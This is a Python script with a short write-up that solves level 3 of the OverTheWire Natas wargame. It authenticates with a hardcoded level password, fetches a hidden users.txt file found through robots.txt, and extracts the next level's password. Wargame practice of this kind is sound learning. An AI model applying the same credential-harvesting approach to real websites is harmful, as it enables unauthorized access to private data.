#%%
import requests
import re

name = "natas3"

url = f"http://{name}.natas.labs.overthewire.org/s3cr3t/users.txt"

auth = (f"{name}","sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14")

session = requests.session()

logon = session.post(url,auth=auth)
regex = re.compile(r'natas4:([\w\d]+)')
try:
    passwd = regex.findall(logon.text)[0]
    print(passwd)
except IndexError:
    print("password not found")

"""Natas 3
This one required some googling. I need to find out how the site can
hide its content from google it's depends on robots.txt file.
I looked up the content of it on our site and found s3cr3t folder,
so I decided to open it and as in Natas 2 there was our file users.txt
with password waiting for me
"""